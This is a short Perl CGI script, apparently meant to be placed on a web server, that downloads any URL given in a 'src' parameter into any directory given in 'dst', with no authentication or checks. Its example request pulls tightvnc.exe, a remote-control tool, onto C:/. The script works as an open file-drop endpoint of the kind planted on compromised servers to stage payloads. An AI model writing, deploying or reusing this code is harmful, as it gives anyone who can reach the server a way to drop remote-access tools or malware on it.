use CGI;
use File::Fetch;

# Example get request:
# http://192.168.1.1/path/upload.pl?src=192.168.2.2/tightvnc.exe&dst=C:/
#
# Note that src parameter takes url without http:// part, and the dst parameter
# takes only destination directory withouth filename

my $request = CGI->new();
my $src = $request->param('src');
my $dst = $request->param('dst');

File::Fetch->new(uri => 'http://'.$src)->fetch(to => $dst);
